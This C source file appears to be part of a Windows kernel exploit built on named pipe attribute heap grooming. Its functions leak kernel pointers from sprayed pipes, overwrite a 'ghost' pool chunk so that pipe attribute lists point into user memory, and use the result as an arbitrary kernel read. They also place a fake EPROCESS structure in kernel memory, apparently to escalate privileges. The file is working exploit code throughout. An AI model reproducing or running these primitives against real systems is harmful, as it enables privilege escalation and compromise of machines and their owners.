#include <stdio.h>


#include "exploit.h"
#include "pipe_utils.h"
#include "logs.h"

void pp_exploit_arbitrary_read(xploit_t * xploit, uintptr_t where, char * out, size_t size)
{
    char arb_read[0x1000];
    size_t ask_size;
    memset(arb_read, 0x48, sizeof(arb_read));

    ask_size = size;

    // If size is <= 8, it doesn't use the pointer
    if (ask_size <= 8)
        ask_size = 9;

    // I need a temporary buffer and don't want to code a loop, so max it to 0x1000
    if (ask_size >= 0x1000)
        ask_size = 0xFFF;
    
    xploit->fake_pipe_attribute->ValueSize = ask_size;
    xploit->fake_pipe_attribute->AttributeValue = (char *)where;

    // use a temporary buffer to avoid overflowing in our program
    if (!get_pipe_attribute(&xploit->ghosts->pipes[xploit->ghost_idx], arb_read, 0x1000))
    {
        fprintf(stderr, "[-] Failed to set pipe attribute !");
        exit(0);
    }
    memcpy(out, arb_read, size);
}

uintptr_t pp_find_file_object(xploit_t * xploit)
{
    uintptr_t file_object_ptr;

    // FsContext2 structure of NPFS. Find the pointer on the file object in the structure 
    file_object_ptr = xploit->leak_root_attribute - ROOT_PIPE_ATTRIBUTE_OFFSET + FILE_OBJECT_OFFSET;
    xploit->leak_root_queue = xploit->leak_root_attribute - ROOT_PIPE_ATTRIBUTE_OFFSET + ROOT_PIPE_QUEUE_ENTRY_OFFSET;

    printf("[+] leak_root_queue is :    0x%llX\n", xploit->leak_root_queue);
    return file_object_ptr;
    
}

void pp_alloc_fake_eprocess(xploit_t * xploit, char * fake_eprocess_buf)
{
    uintptr_t fake_eprocess_queue_entry;
    // The list is currently 
    // ROOT -> GHOST -> FAKE -> 0xDEADDEADCAFE0000 (next chain)
    // so fix it to have
    // ROOT -> GHOST -> FAKE -> ROOT (next chain)
    // because the list is walked when setting a new attribute
    // xploit->fake_pipe_attribute->list.Flink = (struct _LIST_ENTRY *)xploit->leak_root_attribute;

    // The pipe attribute list is corrupted, use the pipe queue entry to store arbitrary data in the kernel
    write_pipe(&xploit->ghosts->pipes[xploit->ghost_idx], fake_eprocess_buf + DUMB_ATTRIBUTE_NAME2_LEN, FAKE_EPROCESS_SIZE * 2);

    // We can read prev or next of the root to find the entry that contains the arbitrary data
    pp_exploit_arbitrary_read(xploit, xploit->leak_root_queue, (char *)&fake_eprocess_queue_entry, 0x8);
    printf("[+] fake process queue pipe is : 0x%llx\n", fake_eprocess_queue_entry);

    // the data is at Entry + LEN_OF_PIPE_QUEUE_ENTRY_STRUCT
    xploit->fake_eprocess = fake_eprocess_queue_entry + LEN_OF_PIPE_QUEUE_ENTRY_STRUCT;

    
}

void pp_free_ghost_chunk(xploit_t * xploit)
{
    // Set a pipe attribute with only the name delete this attribute
    set_pipe_attribute(&xploit->ghosts->pipes[xploit->ghost_idx], ATTRIBUTE_NAME, ATTRIBUTE_NAME_LEN);
}

void pp_alloc_ghost_chunk(xploit_t * xploit, char * buffer)
{
    // After the add, the chain is 
    // ROOT -> GHOST -> ROOT (next chain)
    // ROOT <- GHOST <- ROOT (previous chain)
    set_pipe_attribute(&xploit->ghosts->pipes[xploit->ghost_idx], buffer, xploit->ghost_chunk_size - xploit->struct_header_size);
}

void pp_setup_final_write(xploit_t * xploit, char * buffer)
{
    /**
     *   restore list
     *   ROOT -> GHOST ->  ROOT (next chain)
     *   ROOT <- GHOST <- ROOT (previous chain)
    **/
    strcpy(buffer, ATTRIBUTE_NAME);

    // rebuild the pipe attribute object so it doesn't crash
    *(uintptr_t *)((unsigned char *)buffer + xploit->ghost_chunk_offset + 0x10) = xploit->leak_root_attribute;  // list.next
    *(uintptr_t *)((unsigned char *)buffer + xploit->ghost_chunk_offset + 0x18) = xploit->leak_root_attribute;  // list.prev
    *(uintptr_t *)((unsigned char *)buffer + xploit->ghost_chunk_offset + 0x20) = (uintptr_t)ATTRIBUTE_NAME;    // AttributeName
}

void pp_setup_ghost_overwrite(xploit_t * xploit, char * ghost_overwrite_buf)
{
    pipe_attribute_t  * overwritten_pipe_attribute;

    // The pipe attribute overwritten in the ghost chunk
    strcpy(ghost_overwrite_buf, ATTRIBUTE_NAME);
    overwritten_pipe_attribute = (pipe_attribute_t*)((char *)ghost_overwrite_buf + xploit->ghost_chunk_offset + POOL_HEADER_SIZE);

    // make point the next attribute in userland
    overwritten_pipe_attribute->list.Flink = (LIST_ENTRY *)xploit->fake_pipe_attribute;

    // dummy value, must fix this before exiting to avoid crash
    overwritten_pipe_attribute->list.Blink = (LIST_ENTRY *)0xDEADBEEFCAFEB00B;

    // Set the attrbiute name to a dumb value se we nerver find it when we try to read and attribute from here
    // So it will always go the next attribute which points in userland !
    overwritten_pipe_attribute->AttributeName = DUMB_ATTRIBUTE_NAME;
    overwritten_pipe_attribute->ValueSize = 0x1;
    overwritten_pipe_attribute->AttributeValue = DUMB_ATTRIBUTE_NAME;
}

int pp_get_leak(xploit_t * xploit, pipe_spray_t * respray)
{
    char leak[0x1000] = {0};
    //Leak offset point to ghost_chunk_offset
    xploit->leak_offset = xploit->targeted_vuln_size
        + xploit->offset_to_pool_header - xploit->backward_step
        - xploit->struct_header_size - ATTRIBUTE_NAME_LEN;
    LOG_DEBUG("Leak offset is 0x%X", xploit->leak_offset);

    // leak the data contained in ghost chunk
    xploit->leaking_pipe_idx = read_pipes(respray, leak);
    if (xploit->leaking_pipe_idx == -1)
    {
        if (xploit->backend == LFH)
            fprintf(stderr, "[-] Reading pipes found no leak :(\n");
        else
            LOG_DEBUG("Reading pipes found no leak");
        return 0;
    }

    LOG_DEBUG("Pipe %d of respray leaked data !", xploit->leaking_pipe_idx);

    // leak pipe attribute structure !
    xploit->leak_root_attribute = *(uintptr_t *)((char *)leak + xploit->leak_offset + 0x10); // list.next
    xploit->leak_attribute_name = *(uintptr_t *)((char *)leak + xploit->leak_offset + 0x20); // AttributeName

    // 0x10 is POOL_HEADER
    xploit->ghost_chunk = xploit->leak_attribute_name - LEN_OF_PIPE_ATTRIBUTE_STRUCT - POOL_HEADER_SIZE;

    printf("[+] xploit->leak_root_attribute ptr is 0x%llX\n", xploit->leak_root_attribute);
    printf("[+] xploit->ghost_chunk         ptr is 0x%llX\n", xploit->ghost_chunk);

    return 1;
}
